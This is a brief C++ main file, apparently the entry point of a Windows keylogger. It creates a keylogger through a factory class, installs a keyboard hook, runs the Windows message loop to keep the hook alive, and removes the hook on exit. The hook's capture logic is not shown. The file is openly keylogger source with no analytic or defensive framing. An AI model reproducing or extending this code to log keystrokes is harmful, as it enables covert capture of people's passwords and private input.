#include "KeyloggerFactory.h"

int main()
{
    auto keylogger = keylogger::KeyloggerFactory::createKeylogger();
    keylogger->installHook();

    MSG message;
    while (GetMessage(&message, nullptr, 0, 0))
    {
        TranslateMessage(&message);
        DispatchMessage(&message);
    }

    keylogger->uninstallHook();
    return 0;
}